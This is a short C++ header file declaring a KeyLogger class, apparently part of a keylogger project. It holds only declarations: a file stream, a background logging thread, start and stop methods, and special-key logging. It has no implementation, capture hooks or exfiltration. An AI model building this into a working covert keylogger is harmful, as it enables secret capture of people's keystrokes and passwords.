#ifndef KEYLOGGER_H_
#define KEYLOGGER_H_

#include <iostream>
#include <atomic>
#include <fstream>
#include <thread>

const int kBufSize = 8192;

class KeyLogger {
    // char *buf;
    std::ofstream fout;
    std::atomic_bool stop;
    std::thread logThread;

    public:
        KeyLogger();
        KeyLogger(const KeyLogger &o);
        ~KeyLogger();
        void log(std::string s);
        bool logSpecialKey(int vk);
        KeyLogger& operator=(const KeyLogger &o);
        void startKeylogger();
        void stopKeylogger();
        std::ifstream getLoggingStream();
};

#endif